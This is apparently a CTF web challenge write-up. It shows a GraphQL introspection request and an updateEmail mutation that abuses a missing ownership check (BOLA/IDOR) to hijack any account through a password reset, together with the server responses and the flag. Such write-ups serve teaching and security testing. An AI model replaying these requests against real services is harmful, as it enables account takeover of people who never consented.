ctf web 2024-01-12 — CTF Name 2024

GraphQL introspection → IDOR → full account takeover

overview

GraphQL endpoint had introspection enabled in production. Enumerated the schema, found a mutation that accepted a bare userId parameter with no ownership check. Chained it into a password reset to achieve full account takeover on any user ID with zero victim interaction.

recon

Noticed /api/graphql returning verbose errors on malformed queries. Sent a schema introspection query to map the full API surface. 

POST /api/graphql HTTP/1.1
Host: target.ctf
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name } } } }"
}

Response leaked the entire schema. Two things stood out immediately — a getUser(id: Int!) query and an updateEmail mutation that accepted a plain userId argument.

introspection should be disabled in production. it wasn't.

exploitation

The updateEmail mutation checked the session token was valid but never validated that the token's owner matched the supplied userId. Classic BOLA. 

mutation {
  updateEmail(userId: 1337, email: "[email protected]") {
    success
    message
  }
}

{"data": {"updateEmail": {"success": true, "message": "email updated"}}}

Triggered a password reset to the attacker-controlled address. Game over for user 1337.

impact

  • Full ATO on any account — just supply a different userId
  • No victim interaction required
  • Full schema leaked via enabled introspection
flag CTF{gr4phql_1ntr0sp3ct10n_1s_4_g1ft}

takeaways

Always test GraphQL mutations for BOLA by swapping the user ID to another account's. If the server only checks "is this a valid session" rather than "does this session own this resource", you're in. Introspection being on in prod just makes finding the target mutation a 30-second job.
